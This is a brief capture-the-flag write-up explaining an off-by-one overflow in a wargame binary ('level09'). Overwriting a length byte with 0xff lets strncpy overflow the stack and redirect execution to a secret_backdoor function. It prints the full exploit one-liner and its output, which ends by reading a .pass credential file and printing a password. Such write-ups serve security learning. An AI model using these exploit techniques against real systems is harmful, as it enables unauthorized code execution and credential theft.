# Buffer overflow write of size 1

see source.c

## Analysis

At first sight, we didn't see anything strange. So we tested program on gdb with different input size, looking at the stack and saw that we had written more than 40 bytes, so we could rewrite buffer len.
Then we said " Ahahah"  we could write so much more than 140 bytes with strncpy by replacing buffer len !!
Which character could we use to rewrite more ? 0xff ! We then locate eip of handle_msg and rewrite it to target `secret_backdoor()`

Then GG ! c:

## Exploit

```
(python -c "print('A' * 40 + '\xff')"; python -c "print('B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')"; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
